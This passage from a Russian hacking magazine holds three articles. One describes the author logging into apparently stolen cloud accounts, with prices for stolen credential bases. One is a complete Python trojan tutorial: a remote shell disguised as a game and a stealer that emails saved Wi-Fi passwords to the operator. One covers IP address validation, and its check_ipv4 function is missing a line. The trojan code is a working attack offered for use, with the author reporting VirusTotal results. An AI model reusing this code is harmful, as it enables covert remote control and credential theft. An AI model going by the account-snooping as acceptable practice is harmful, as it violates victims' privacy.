 • 250 долларов за миллион комбинаций в «миксованных базах», где могут
   попадаться любые домены.

Впрочем, бывает как дешевле, так и дороже. А еще часто попадаются сами
слитые базы, но разгребать гигантские дампы — отдельное непростое
занятие.
  И конечно, вовсю про даются стилеры, при помощи которых можно зав‐
ладеть чужими учетками. Нап ример, сти лер AZORult стоит 100 долларов,
а UFR Stealer всего в районе 20–50.


             INFO

                     Читай также: «Трояны на продажу. Изучаем под‐
                       польный рынок вредоносного ПО».



ЧТО В ОБЛАЧКЕ ЛЕЖИТ
К нам в руки попало несколько учетных записей, подобных тем, что продают‐
ся на подпольных форумах. Они были отоб раны специально, поэтому все они
открывались и во всех из них что‐нибудь да лежало. Сейчас мы с тобой заг‐
лянем туда. Естественно, исключитель но в исследовательских целях. Заходя
в аккаунты, я лишь делал скрин шоты, чтобы продемонстрировать типичное
содержимое.


Пример 1. Заброшка
Перед нами аккаунт Dropbox, соз данный в Германии. Внутри две папки: одна
пустая, в другой — фотог рафии автомобилей и документов, вероятно связан‐
ных с повреждениями этих автомобилей. Всего 161 снимок; последнее изме‐
нение датируется ноябрем 2020 года.





Взломщику или шантажисту здесь ловить, скорее все го, нечего, к тому же
никакой активности на этом аккаунте уже давно нет, а значит, вероятно, он
заброшен. Как, по всей видимости, и доб рая половина продающихся уче ток.
  Почему люди забрасывают свои хранилища? Причин может быть множес‐
тво, но самая распростра ненная — это забытый пароль и нежелание копать‐
ся с его восстановлением. Зато личные данные продол жат там лежать
годами.


Пример 2. Чужие паспорта
Снова Dropbox, и содержимое на этот раз более занимательное.





Речь, конечно, не о фотографиях владельца, рассекающего снег на сноубор‐
де. Речь — о целом скла де документов, явно принадлежащих не ему и не чле‐
нам его семьи.





Сложно сказать, как владелец аккаунта соб рал все это и с какой целью хра‐
нит. Возможно, он имел на это полное право. Но неприятно здесь другое:
мысль о том, что сканы твоего пас порта или водительского удостоверения
могут попасть (и регулярно попада ют) в руки людям, которые не слышали
об элементарных мерах безопасности.


Пример 3. Кредитка
Закинуть в Dropbox фотог рафии вечеринок — вполне нормальная идея. А вот
добавлять к этой кол лекции кредитную карту, да еще и сфотографированную
с обеих сторон... мягко говоря, не очень.





В той же папке лежал ворох документов хозяйки и дей ствующий QR‐код груп‐
пы в WhatsApp. Правда, всего с одним участником. Заглядывать я пос теснял‐
ся.





Пример 4. Платный акк
В этом аккаунте на Dropbox не было бы ничего примечательного, не будь он
оплачен на год вперед. При этом практически не использовался — занято
всего 3,6 Гбайт из 2 Тбайт.





Похоже, акк просто забыт, и хакер может использовать его любым кре атив‐
ным способом.


Пример 5. Пароль в корзине
Сервис под названием pCloud не особенно известен, но и такие встречаются
в базах скомпрометированных аккаунтов. Примеча тельно здесь вот что: если
ты отвлечешься от чужих фотографий из отпуска и присмотришься к панели
слева, то заметишь, что там среди про чего перечис лено шиф рованное хра‐
нилище.





А еще там есть кор зина, а в корзине — какие‐то файлы. В одном из них (он
назывался wtf.dat) лежал длинный ключ, который успешно подошел к разделу
с шифрованием.
  Видим российские паспорта, кредит ки, пра ва и страховые удостоверения.





Мораль: корзину нужно иногда выбрасывать, а если кинул туда что‐то важное,
то лучше и очистить сразу.


Пример 6. Стволы
А вот и аккаунт, владелец которого фактичес ки соб рал на себя коллекцию
готового компромата. Среди уже привычных документов — его автопортреты
с разных ракурсов, включая крайне интимные, а также оружие — обычное
и позолоченное.





Пример 7. Пиратство
Если ты думаешь, что подкованный по части IT человек относится к защите
своих данных намного серь езнее, то ты ошибаешь ся. Вот учетка на MediaFire,
принадлежащая какому‐то рус скоговорящему товарищу. Он складиру ет там
пиратский софт и насобирал уже с полсотни прог рамм и ути лит.





Дорогой владелец, если ты вдруг сейчас узнал свое добро, обрати внимание
на то, что Disk Defrag Ultimate и некоторые другие твои файлы вызывают бес‐
покойство у антивируса. И конечно, беги менять пароли везде где только
можно.


Пример 8. Inception
Ну уж хакеры‐то дол жны что‐то понимать в защите аккаунтов? Дол жны, конеч‐
но, и, скорее всего, понимают. Но привычку сно ва и снова вбивать в поле
«пароль» одни и те же буквы изжить не так‐то прос то. Даже когда собираешь‐
ся складировать файлы типа «картон.txt».





Чего только не нашлось в этом акка унте на MediaFire: и разные методы
заработка, и обучение кардингу, и какие‐то мутные схемы, и материалы
для работы в этих схемах, и еще куча самой разной незаконной инфы.
  Везде, правда, ноль скачиваний, так что перед нами, вероятно, бэкап. Мы
тоже не стали притрагивать ся к этим сомнительным россыпям, и тебе
не советуем.


Примеры 9 и 10. Спецы по ИБ
Думаешь, это был единичный случай? Вот еще два аккаунта горе‐хакеров
на Megaupload. В одном лежат курсы по Metasploit, набор утилит для взлома,
какой‐то гайд по веб‐обороне.





А вот кто‐то хранит свои наступательные утилиты: сканер веб‐уязвимостей —
Acunetix уже устаревшей версии 10.0 и фреймворк Cobalt Strike.





             INFO

                     Подробнее об Acunetix читай в статье в статье
                            «Хак в один клик»), о Cobalt Strike — в нашем
                      материале «Фреймворки для постэксплуатации».


В обоих случаях на файлы проставлены внешние ссылки, а значит, кто‐то
где‐то их запостил.


КАК НЕ СТАТЬ ЖЕРТВОЙ ВЗЛОМА
Думаю, бессмысленно говорить, что все рассмотренные аккаунты не были
защищены как сле дует. Владельцам стоило соблюдать хотя бы базовые пра‐
вила цифровой гигиены.
   Увернуться от целевой атаки может быть проблематично, но большинство
взломов — массовые. В  их ходе для подбора паролей применяются
огромные базы или  утечки  с  раз ных скомпро метированных сервисов.
Для защиты в таком случае достаточно следовать простым рекомендациям.
   Главное из них — надежные и, что даже более важно, разные пароли.
Для их создания и хранения обычно используют менед жер паролей: 1Pass‐
word, KeePass, маковский iCloud Keychain и другие, выбирай на свой вкус.


             INFO

                    По статистике на 2020 год, каждый 142‐й пароль
                        в мире — 123456.


Двухфакторная аутентифика ция, хоть и имеет свои ограничения и недостатки,
но тоже станет серьезной преградой для желающих подобрать твой пароль.
Не пренебрегай ей, если есть возможность, и отдавай пред почте ние тем
сервисам, где она поддерживает ся.
   Ну и наконец, шифрование — это пос ледний бастион, который защитит
важные документы, даже если акка унт таки взломают. Главное — не ставь
на контейнер все тот же пароль и не оставляй его лежать рядом!
  При этом сами разработ чики облачных сервисов тоже не сидят сложа руки
и делают что могут, чтобы обезопасить данные от пользователей. Например,
сервисы Google не только время от времени пристают с просьбой добавить
второй фактор, но даже без него будут оповещать о попытках доступа к акка‐
унту, а брутфорс пресекают на корню. Так что остается всего лишь не под‐
рывать и не игно рировать все эти усилия.
КОДИНГ

КРАДУЩИЙСЯ
ПИТОН





    Валерий Линьков
    Дипломированный
специалист и инструктор Cis‐
co, основатель академии Cis‐
co, автор технических статей
  нацбезопасности России,
    сисадмин, ИБшник,
        питонист, гик
         valerylinkov.ru

СОЗДАЕМ ПРОСТЕЙШИЙ ТРОЯН
НА PYTHON





В этой статье я расскажу, как написать на Python простей‐
ший троян с удаленным доступом, а для большей скрытности
мы встроим его в игру. Даже если ты не знаешь Python, ты
сможешь лучше понять, как устроены такие вредоносы,
и поупражняться в программировании.


Конечно, приведенные в статье скрипты никак не годятся для использования
в боевых условиях: обфускации в них нет, прин ципы работы просты как палка,
а вредоносные функции отсутс твуют напрочь. Тем не менее при некоторой
смекал ке их возможно использовать для несложных пакос тей — например,
вырубить чей‐нибудь компьютер в клас се (или в офи се, если в классе ты
не наигрался).


             INFO

                     Читай также: «Ядовитый питон. Пишем на Python
                      простейшую  малварь:  локер,  шифровальщик
                      и вирус».



ТЕОРИЯ
Итак, что вообще такое троян? Вирус — это программа, главная задача
которой — самокопирование. Червь активно распространяется по сети
(типичный пример — «Петя» и WannaCry), а тро ян — скры тая вре доносная
программа, которая маскируется под «хороший» софт.
  Логика подобного заражения в том, что пользователь сам скачает себе
вредонос на компьютер (нап ример, под видом крякнутой программы), сам
отключит защитные механизмы (ведь программа выглядит хорошей) и захочет
оставить надолго. Хакеры и тут не дремлют, так что в новостях то и дело мель‐
кают сообщения о новых жертвах пиратского ПО и о шифровальщиках,
поражающих любителей халявы. Но мы‐то знаем, что бесплатный сыр бывает
только в мусорке, и сегодня научимся очень прос то начинять тот самый сыр
чем‐то не вполне ожидаемым.


           WARNING

                      Вся информация предоставлена исключительно
                        в ознакомительных целях. Ни автор, ни редакция
                      не несут ответственности за любой возможный
                        вред, причинен ный материалами данной статьи.
                      Несан кционирован ный  доступ  к  информации
                      и нарушение работы систем могут преследовать‐
                        ся по закону. Помни об этом.



ОПРЕДЕЛЯЕМ IP
Сначала нам (то есть нашему трояну) нужно определиться, где он оказался.
Важная часть тво ей информа ции — IP‐адрес, по которому с зараженной
машиной можно будет соединиться в дальнейшем.
   Начнем писать код. Сразу импортируем биб лиотеки:


import socket
from requests import get

Обе библиотеки не поставляются с Python, поэтому, если они у тебя отсутс‐
твуют, их нужно установить командой pip.


pip install socket
pip install requests


             INFO

                      Если ты видишь ошибку, что у тебя отсутствует
                             pip, сначала нужно установить его с сайта pyp‐
                              i.org. Любопытно,  что рекомендуемый способ
                         установки pip — через pip, что, конечно, очень
                       полезно, когда его нет.


Код получения внешнего и внутреннего адресов будет таким. Обрати вни‐
мание, что, если у жертвы несколько сетевых интерфейсов (например, Wi‐Fi
и Ethernet одновременно), этот код может вес ти себя неправильно.


# Определяем имя устройства в сети
hostname = socket.gethostname()


# Определяем локальный (внутри сети) IP‐адрес
local_ip = socket.gethostbyname(hostname)


# Определяем глобальный (публичный / в интернете) IP‐адрес
public_ip = get('http://api.ipify.org').text

Если с локальным адресом все более‐менее просто — находим имя устрой‐
ства в сети и смотрим IP по имени устройства, — то вот с публичным IP все
немного сложнее.
  Я выбрал сайт api.ipify.org, так как на выходе нам выдается только
одна строка — наш внеш ний  IP. Из связ ки публичный + локальный IP мы
получим почти точный адрес устройства.
  Вывести информацию еще проще:


print(f'Хост: {hostname}')
print(f'Локальный IP: {local_ip}')
print(f'Публичный IP: {public_ip}')

Никогда не встречал конструкции типа print(f'{}')? Буква f означает фор‐
матированные строковые литералы. Прос тыми словами — программные
вставки прямо в строку.


             INFO

                      Строковые литералы не только хорошо смотрятся
                        в коде, но и помогают избегать ошибок типа сло‐
                      жения  строк  и  чисел  (Python —  это  тебе
                       на JavaScript!).


Финальный код:


import socket
from requests import get


hostname = socket.gethostname()
local_ip = socket.gethostbyname(hostname)
public_ip = get('http://api.ipify.org').text


print(f'Хост: {hostname}')
print(f'Локальный IP: {local_ip}')
print(f'Публичный IP: {public_ip}')

Запустив этот скрипт, мы смо жем определить IP‐адрес нашего (или чужого)
компьютера.


БЭККОННЕКТ ПО ПОЧТЕ
Теперь напишем скрипт, который будет присылать нам письмо.
  Импорт новых библиотек (обе нужно предварительно поставить через pip
install):


import smtplib as smtp
from getpass import getpass

Пишем базовую информацию о себе:


# Почта, с которой будет отправлено письмо
email = 'xakepmail@yandex.ru'


# Пароль от нее (вместо ***)
password = '***'


# Почта, на которую отправляем письмо
dest_email = 'demo@xakep.ru'


# Тема письма
subject = 'IP'


# Текст письма
email_text = 'TEXT'

Дальше сформируем пись мо:


message = 'From: {}\nTo: {}\nSubject: {}\n\n{}'.format(email,
dest_email, subject, email_text)

Последний штрих — настроить подключение к почтовому сервису. Я поль‐
зуюсь Яндекс.Почтой, поэто му нас тройки выставлял для нее.


server = smtp.SMTP_SSL('smtp.yandex.com') # SMTP‐сервер Яндекса
server.set_debuglevel(1) # Минимизируем вывод ошибок (выводим только
фатальные ошибки)
server.ehlo(email) # Отправляем hello‐пакет на сервер
server.login(email, password) # Заходим на почту, с которой будем
отправлять письмо
server.auth_plain() # Авторизуемся
server.sendmail(email, dest_email, message) # Вводим данные для
отправки (адреса свой и получателя и само сообщение)
server.quit() # Отключаемся от сервера

В строке server.ehlo(email) мы исполь зуем команду EHLO. Большинс тво
серверов SMTP поддерживают ESMTP и EHLO. Если сервер, к которому ты
пытаешься подклю читься, не поддерживает EHLO, можно использовать HELO.
  Полный код этой час ти трояна:


import smtplib as smtp
import socket
from getpass import getpass
from requests import get


hostname = socket.gethostname()
local_ip = socket.gethostbyname(hostname)
public_ip = get('http://api.ipify.org').text


email = 'xakepmail@yandex.ru'
password = '***'
dest_email = 'demo@xakep.ru'
subject = 'IP'
email_text = (f'Host: {hostname}\nLocal IP: {local_ip}\nPublic IP: {
public_ip}')


message = 'From: {}\nTo: {}\nSubject: {}\n\n{}'.format(email,
dest_email, subject, email_text)


server = smtp.SMTP_SSL('smtp.yandex.com')
server.set_debuglevel(1)
server.ehlo(email)
server.login(email, password)
server.auth_plain()
server.sendmail(email, dest_email, message)
server.quit()

Запустив этот скрипт, получаем письмо.





                           Письмо с IP

Этот скрипт я проверил на VirusTotal. Результат на скрине.





                                     Продолжение статьи →
КОДИНГ              ← НАЧАЛО СТАТЬИ
  КРАДУЩИЙСЯ ПИТОН
         СОЗДАЕМ ПРОСТЕЙШИЙ ТРОЯН НА PYTHON





ТРОЯН
По задумке, троян представляет собой клиент‐серверное приложение с кли‐
ентом на машине атакуемого и сервером на запускающей машине. Дол жен
быть реализован максимальный удаленный дос туп к системе.
   Как обычно, начнем с биб лиотек:


import random
import socket
import threading
import os

Для начала напишем игру «Уга дай число». Тут все крайне прос то, поэтому
задерживаться дол го не буду.


# Создаем функцию игры
def game():


    # Берем случайное число от 0 до 1000
    number = random.randint(0, 1000)
    # Счетчик попыток
    tries = 1
    # Флаг завершения игры
    done = False


    # Пока игра не закончена, просим ввести новое число
    while not done:
        guess = input('Введите число: ')


        # Если ввели число
        if guess.isdigit():
            # Конвертируем его в целое
            guess = int(guess)
            # Проверяем, совпало ли оно с загаданным; если да,
опускаем флаг и пишем сообщение о победе
            if guess == number:
                done = True
                print(f'Ты победил! Я загадал {guess}. Ты
использовал {tries} попыток.')
            # Если же мы не угадали, прибавляем попытку и проверяем
число на больше/меньше
            else:
                tries += 1
                if guess > number:
                    print('Загаданное число меньше!')
                else:
                    print('Загаданное число больше!')
        # Если ввели не число — выводим сообщение об ошибке и просим
ввести число заново
        else:
            print('Это не число от 0 до 1000!')


             INFO

                     Зачем столько сложностей с проверкой на число?
                  Можно было просто написать guess = int(
                   input('Введите число: ')). Если бы мы
                       написали так, то при вводе чего угодно, кроме
                       числа, выпадала бы ошибка, а этого допустить
                       нельзя, так как ошибка заставит программу оста‐
                        новиться и обрубит соединение.


Вот код нашего трояна. Ниже мы будем раз бирать ся, как он работает, чтобы
не проговаривать заново базовые вещи.


# Создаем функцию трояна
def trojan():
    # IP‐адрес атакуемого
    HOST = '192.168.2.112'
    # Порт, по которому мы работаем
    PORT = 9090


    # Создаем эхо‐сервер
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((HOST, PORT))


    while True:
        # Вводим команду серверу
        server_command = client.recv(1024).decode('cp866')
        # Если команда совпала с ключевым словом 'cmdon', запускаем
режим работы с терминалом
        if server_command == 'cmdon':
            cmd_mode = True
            # Отправляем информацию на сервер
            client.send('Получен доступ к терминалу'.encode('cp866'))
            continue
        # Если команда совпала с ключевым словом 'cmdoff', выходим
из режима работы с терминалом
        if server_command == 'cmdoff':
            cmd_mode = False
        # Если запущен режим работы с терминалом, вводим команду в
терминал через сервер
        if cmd_mode:
            os.popen(server_command)
        # Если же режим работы с терминалом выключен — можно вводить
любые команды
        else:
            if server_command == 'hello':
                print('Hello World!')
        # Если команда дошла до клиента — выслать ответ
        client.send(f'{server_command} успешно отправлена!'.encode(
'cp866'))

Сначала нужно разоб раться, что такое сокет и с чем его едят. Сокет простым
языком — это условная вилка или розетка для программ. Существуют клиент‐
ские и серверные сокеты: серверный прослушивает определенный порт
(розетка), а клиентский подключается к серверу (вилка). После того как уста‐
новлено соединение, начинается обмен данными.
   Итак, строка client = socket.socket(socket.AF_INET, socket.SOCK‐
_STREAM) создает эхо‐сервер (отправили запрос — получили ответ). AF_INET
означает работу с IPv4‐адресацией, а SOCK_STREAM указывает на то, что мы
используем TCP‐подклю чение вмес то UDP, где пакет посылается в сеть
и далее не отслеживается.
   Строка client.connect((HOST, PORT)) ука зывает IP‐адрес хос та и порт,
по которым будет произво диться подключение, и сразу подключается.
  Функция client.recv(1024) принимает данные из сокета и является так
называемым блокирующим вызовом. Смысл такого вызова в том, что, пока
команда не передастся или не будет отвергнута другой стороной, вызов
будет продолжать выполнять ся. 1024 — это количество задействованных бай‐
тов под буфер приема. Нельзя будет принять больше 1024 байт (1 Кбайт)
за один раз, но нам это и не нужно: час то ты руками вводишь в консоль боль‐
ше 1000 символов? Пытать ся многократно увеличить размер буфера не сто‐
ит — это затратно и бесполезно, так как нужен боль шой буфер примерно раз
в никогда.
  Команда decode('cp866') декодирует полученный байтовый буфер в тек‐
стовую стро ку согласно заданной кодировке (у нас 866). Но почему именно
cp866? Зайдем в командную строку и введем команду chcp.





                     Текущая кодовая страница

Кодировка по умол чанию для русско говорящих устройств — 866, где кирил‐
лица добав лена в латиницу. В англо язычных версиях системы используется
обычный Unicode, то есть utf‐8 в Python. Мы же говорим на русском язы ке,
так что поддерживать его нам прос то необ ходимо.


             INFO

                    При желании кодировку можно поменять в коман‐
                      дной строке, наб рав после chcp ее номер. Юни‐
                       код имеет номер 65001.


При приеме команды нужно определить, не слу жебная ли она. Если так,
выпол няем определен ные действия, ина че, если вклю чен терминал, перенап‐
равляем команду туда. Недостаток — результат выполнения так и остается
необработанным, а его хорошо бы отправлять нам. Это будет тебе домашним
заданием: реализовать эту функцию можно от силы минут за пятнадцать,
даже если гуглить каждый шаг.
  Результат проверки клиента на VirusTotal порадовал.





Базовый троян написан, и сейчас можно сделать очень многое на машине
атакуемого, ведь у нас доступ к командной строке. Но почему бы нам не рас‐
ширить набор функций? Давай еще пароли от Wi‐Fi стащим!


WI-FI-СТИЛЕР
Задача — создать скрипт, который из командной строки узнает все пароли
от доступных сетей Wi‐Fi.
  Приступаем. Импорт библиотек:


import subprocess
import time

Модуль subprocess нужен для соз дания новых про цес сов и соеди нения c
потоками стандартного ввода‐вывода, а еще для получения кодов возврата
от этих процессов.
   Итак, скрипт для извлечения паролей Wi‐Fi:


# Создаем запрос в командной строке netsh wlan show profiles,
декодируя его по кодировке в самом ядре
data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles'])
.decode('cp866').split('\n')


# Создаем список всех названий всех профилей сети (имена сетей)
Wi‐Fis = [line.split(':')[1][1:‐1] for line in data if "Все профили
пользователей" in line]


# Для каждого имени...
for Wi‐Fi in Wi‐Fis:
    # ...вводим запрос netsh wlan show profile [имя_сети] key=clear
    results = subprocess.check_output(['netsh', 'wlan', 'show',
'profile', Wi‐Fi, 'key=clear']).decode('cp866').split('\n')
    # Забираем ключ
    results = [line.split(':')[1][1:‐1] for line in results if
"Содержимое ключа" in line]
    # Пытаемся его вывести в командной строке, отсекая все ошибки
    try:
        print(f'Имя сети: {Wi‐Fi}, Пароль: {results[0]}')
    except IndexError:
        print(f'Имя сети: {Wi‐Fi}, Пароль не найден!')

Введя команду netsh wlan show profiles в командной строке, мы получим
следующее.





                           netsh wlan show proﬁles

Если распарсить вывод выше и подста вить имя сети в команду netsh wlan
show profile [имя сети] key=clear, результат будет как на картинке. Его
можно разобрать и вытащить пароль от сети.





                   netsh wlan show proﬁle ASUS key=clear





                       Вердикт VirusTotal

Осталась одна проб лема: наша изна чальная задумка была забрать пароли
себе, а не показывать их пользователю. Испра вим же это.
  Допишем еще один вариант команды в скрипт, где обрабаты ваем наши
команды из сети.


if server_command == 'Wi‐Fi':


    data = subprocess.check_output(['netsh', 'wlan', 'show',
'profiles']).decode('cp866').split('\n')
    Wi‐Fis = [line.split(':')[1][1:‐1] for line in data if "Все
профили пользователей" in line]


    for Wi‐Fi in Wi‐Fis:
        results = subprocess.check_output(['netsh', 'wlan', 'show',
'profile', Wi‐Fi, 'key=clear']).decode('cp866').split('\n')
        results = [line.split(':')[1][1:‐1] for line in results if
"Содержимое ключа" in line]
        try:
            email = 'xakepmail@yandex.ru'
            password = '***'
            dest_email = 'demo@xakep.ru'
            subject = 'Wi‐Fi'
            email_text = (f'Name: {Wi‐Fi}, Password: {results[0]}')


            message = 'From: {}\nTo: {}\nSubject: {}\n\n{}'.format(
email, dest_email, subject, email_text)


            server = smtp.SMTP_SSL('smtp.yandex.com')
            server.set_debuglevel(1)
            server.ehlo(email)
            server.login(email, password)
            server.auth_plain()
            server.sendmail(email, dest_email, message)
            server.quit()
        except IndexError:
            email = 'xakepmail@yandex.ru'
            password = '***'
            dest_email = 'demo@xakep.ru'
            subject = 'Wi‐Fi'
            email_text = (f'Name: {Wi‐Fi}, Password not found!')


            message = 'From: {}\nTo: {}\nSubject: {}\n\n{}'.format(
email, dest_email, subject, email_text)


            server = smtp.SMTP_SSL('smtp.yandex.com')
            server.set_debuglevel(1)
            server.ehlo(email)
            server.login(email, password)
            server.auth_plain()
            server.sendmail(email, dest_email, message)
            server.quit()


             INFO

                       Этот скрипт прост как два рубля и ожи дает уви‐
                        деть русскоязычную систему. На других языках
                        это не сработает, но исправить поведение скрип‐
                          та можно простым выбором разделителя из сло‐
                         варя, где ключ — обнаружен ный на компьютере
                         язык, а значение — требуемая фраза на нужном
                      языке.


Все команды этого скрипта уже подробно разобраны, так что я не буду пов‐
торяться, а просто покажу скриншот из своей почты.



                           Результат


Доработки
Конечно, тут можно дорабо тать примерно все — от защиты канала передачи
до защиты самого кода нашего вредоно са. Методы свя зи с управляющими
серверами злоумышленника тоже обычно используются другие, а работа
вредоноса не зависит от языка операционной системы.
  И конечно, сам вирус очень желательно упа ковать с помощью PyInstaller,
чтобы не тянуть с собой на машину жертвы питон и все зависимости. Игра,
которая тре бует для работы установить модуль для работы с почтой, — что
может больше внушать доверие?


ЗАКЛЮЧЕНИЕ
Сегодняшний троян настолько прост, что его никак нельзя назвать боевым.
Тем не менее он полезен для изу чения основ языка Python и понимания алго‐
ритмов работы более сложных вредоносных программ. Мы надеемся, что ты
уважаешь закон, а полученные знания о троянах тебе никогда не понадобят‐
ся.
  В качестве домашнего задания рекомендую попробовать реализовать
двусторонний терминал и шифрование данных хотя бы с помощью XOR.
Такой троян уже будет куда интерес нее, но, безусловно, использовать его
in the wild мы не призываем. Будь аккуратен!
  АДМИН





                                                                             Даниил Батурин
                                                                                         Координатор проекта
                                                                               VyOS (https://vyos.io),
                                                                                                     «языковед»,
                                                                                           функциональщик,
                                                                                               иногда сетевой
                                                                                            администратор
                                                                                                             daniil@baturin.org
IP
 БЕЗ ОШИБОК

    ИЗУЧАЕМ ПРИНЦИПЫ РАБОТЫ
        С IP‐АДРЕСАМИ




  Любое приложение, которое хоть как‐то работает с сетью,
  должно валидировать правильность IP‐адресов. Это слож‐
   нее, чем может показаться. Здесь легко впасть в крайности:
  при излишне строгой валида ции пользователь не сможет
   ввести верные дан ные, при недостаточной — окажется
  наедине с низкоуровневыми сообщениями об ошибках (если
  они вообще переда ются). В этой статье мы раз берем ряд
  сложностей, возникающих при валида ции адресов, а потом
  посмотрим на готовые библиотеки, которые с этим помога‐
   ют.


  ВАЛИДАЦИЯ АДРЕСОВ
   Ошибки в адресах могут появиться тремя спо собами:
    • опечатки;
    • недопонимание;
    • намеренные попытки сло мать приложение.

   От попыток сломать приложение одна валидация адре сов не поможет. Она
   может затруднить такие попытки, но не заменит полноценную проверку авто‐
   ризации и обработку ошибок на всех этапах работы программы, так что улуч‐
   шение безопасности нуж но рассматривать ско рее как полезный побочный
   эффект. Основная цель — упростить жизнь пользователям, которые случайно
   ввели неверный адрес или неправильно поняли, что от них требуется.
     Проверки можно условно разделить на про верки по форме и по существу.
   Цель формальной проверки — убедиться, что введенная пользователем
   строка вообще может быть допустимым адресом. Многие программы огра‐
   ничиваются именно этим. Мы же пойдем даль ше и посмотрим, как можно
   проверять, что адрес не только пра виль ный, но и подходящий для конкретной
   цели, но об этом позже.


   Проверки по форме
   Проверка правильности формата только на вид может показаться задачей
   для несложного регулярного выражения — на деле все не так просто.
     В IPv4 сложности начинаются со стандарта на этот формат — такого стан‐
   дарта не существует. Формат dot‐decimal  (0.0.0.0–255.255.255.255) —
   общепринятый, но не стандартный. Стандарт IPv4 не содержит никаких упо‐
   минаний о формате записи адресов вооб ще. Никакой другой RFC тоже
   ничего не говорит о формате адресов IPv4, так что общепринятый формат —
   это не более чем соглашение.
    И это даже не единственное сог лашение. Функция inet_aton() позволя‐
    ет не писать нулевые разряды в конце адреса, например 192.0.2 = 192.0.
   2.0. Кроме того, она поз воляет вводить адрес одним целым числом, 511 =
   0.0.1.255.


               INFO

                     Может ли адрес хоста заканчиваться на ноль?
                          Конечно, может — в любой сети размером больше
                            /23 найдется хотя бы один такой. Например,
                      192.168.0.0/23  содержит  адреса  хостов
                      192.168.0.1–192.168.1.254,     включая
                      192.168.1.0.


   Если ограничиться поддержкой только пол ного dot‐decimal из четырех групп,
   без возможности опускать нулевые раз ряды, то выражение (\d+)\.(\d+)\.
   (\d+)\.(\d+) может поймать значительную часть опечаток. Если задаться
   целью, можно составить выражение для любого допустимого адреса, хотя
   оно и будет довольно громоз дким. Лучше вос пользоваться тем, что его легко
   разделить на группы, и явно проверить, что каждая из них попадает в диапа‐
   зон 0–255:


   def check_ipv4(s):
       groups = s.split('.')
       if len(groups) != 4:
       for g in groups:
           num = int(g)
           if (num > 255) or (num < 0):
               raise ValueError("Invalid octet value")

  С IPv6 все одновременно про ще и сложнее. Проще потому, что авторы
    IPv6 учли опыт IPv4 и добавили формат записи адресов в RFC 4291. О любых
   альтернативных форматах мож но смело говорить, что они против стандарта,
   и игнорировать. С другой стороны, сами форматы сложнее. Основную слож‐
   ность представ ляет сокращен ная запись: группы нулевых раз рядов можно
   заменять на символ ::, например 2001:db8::1 вместо 2001:db8:0:0:0:0:
   0:1. Для пользователя это, безус ловно, удобно, но для разработчика все
   ровно наоборот: разделить адрес на груп пы по двоеточию невозможно, нуж‐
   на заметно более сложная логика. К тому же стандарт запрещает исполь‐
   зовать :: больше одного раза в одном адресе, что еще сильнее усложняет
    задачу.
      Так что, если приложение поддерживает IPv6, для валидации адресов
   нужен полноцен ный парсер. Писать его самим нет смысла, поскольку сущес‐
    твуют готовые библиотеки, которые предос тавля ют и другие полезные фун‐
    кции.


   Проверки по существу
   Если уж мы взялись подключать биб лиотеку и парсить адреса, давай пос‐
   мотрим, какие допол нительные проверки мы можем провес ти, чтобы отсеять
   ошибочные значения и сделать сооб щения об ошиб ках более информатив‐
   ными.
     Нужные провер ки будут зависеть от того, как будет использоваться адрес.
   Например, пусть пользователь хотел ввести в поле адре са сервера DNS зна‐
   чение 124.1.2.3, но опечат ка превратила его в 224.1.2.3. Проверка фор‐
   мата эту опечатку не поймает — формат правиль ный. Однако этот адрес
   никак не может быть адресом сервера DNS, пос кольку сеть 224.0.0.0/4
   зарезервирована  для  мно гоадресной  маршру тизации,  которую  DNS
   не использует никогда.
      Если ты хочешь отсеять все адреса, которые не могут быть адре сами хос‐
   тов в публичном интернете, почти полный список зарезервированных сетей
   можно найти в RFC 5735 (Special use IPv4 addresses). «Почти полный» он
   потому, что не вклю чает сеть 100.64.0.0/10, выделенную для CG‐NAT (RFC
   6598).  Совсем  пол ный  список  всех  зарезервированных  диапазонов
    IPv4 и IPv6 можно найти в RFC 6890, однако он не так удоб но организован.
     При этом нужно обратить внимание на мас ки подсетей. Некоторые
   полагают, что сеть для час тно го использования — 172.16.0.0/16 (172.16.
   0.0–172.16.255.255). Чтение RFC5735 легко раз веет этот миф: на самом
   деле она заметно больше, 172.16.0.0/12 (172.16.0.1–172.31.255.254).
   Реальный пример этой ошиб ки в GoatCounter — скрипт сбора статистики
   ошибочно считал посещения изнутри локальной сети.
     Нужно  также учитывать, что «зарезервированные для использования
   в будущем» сети могут перестать быть зарезервированными. Сети из RFC
   5735 зарезервированы навсегда и в этом смысле безопасны. А вот авторы
   некогда популярной среди геймеров вир туальной сети Hamachi когда‐то счи‐
    тали, что сеть 5.0.0.0/8 можно использовать для своих нужд, потому что она
   была зарезервирована для будущего использования, — пока будущее
   не наступило и IANA не выделила эту сеть RIPE.


  БИБЛИОТЕКИ
   netaddr
   В стандартной библиотеке Python 3 уже есть модуль ipaddress, но, если есть
   возможность  поставить  сто роннюю биб лиотеку,  netaddr может  сильно
   упростить жизнь. К при меру, в ней есть встроенные функции для проверки
   принадлежности адреса к зарезервированным диапа зонам.


   >>> import netaddr
   >>> def is_public_ip(s):
   ...     ip = netaddr.IPAddress(s)
   ...     return (ip.is_unicast() and not ip.is_private() and not ip.
   is_reserved())
   ...
   >>> is_public_ip('192.0.2.1') # Reserved for documentation
   False
   >>> is_public_ip('172.16.1.2') # Reserved for private networks
   False
   >>> is_public_ip('224.0.0.5') # Multicast
   False
   >>> is_public_ip('8.8.8.8')
   True

   Даже если бы этих функций не было, мы могли бы легко реализовать их сами.
   Библиотека очень грамотно использует ма гичес кие методы, чтобы сделать
   интерфейс таким же удобным, как у встро енных объ ектов Python. Например,
   проверку принадлежнос ти адреса к сети или диапазону можно выполнить
   оператором in, так что работать с ними не сложнее, чем со списками
   или словарями.


   def is_public_ip(s):
       loopback_net = netaddr.IPNetwork('127.0.0.0/8')
       multicast_net = netaddr.IPNetwork('224.0.0.0/4')
       ...


       ip = netaddr.IPAddress(s)
       if ip in multicast_net:
           raise ValueError("Multicast address found")
       elif ip in loopback_net:
           raise ValueError("Loopback address found")
       ...


    libcidr
   Даже для чистого С можно найти библиотеку с удоб ным интерфейсом, такую
    как libcidr Мэттью Фуллера. В Debian ее можно поставить из репози ториев.
   Для примера напишем проверку принадлежности адреса к сети multicast
   и положим ее в файл is_multicast.c.


   #include <stdio.h>
   #include <libcidr.h>


   void main(int argc, char** argv) {
       const char* ipv4_multicast_net = "224.0.0.0/4";


       CIDR* ip = cidr_from_str(argv[1]);
       CIDR* multicast_net = cidr_from_str(ipv4_multicast_net);


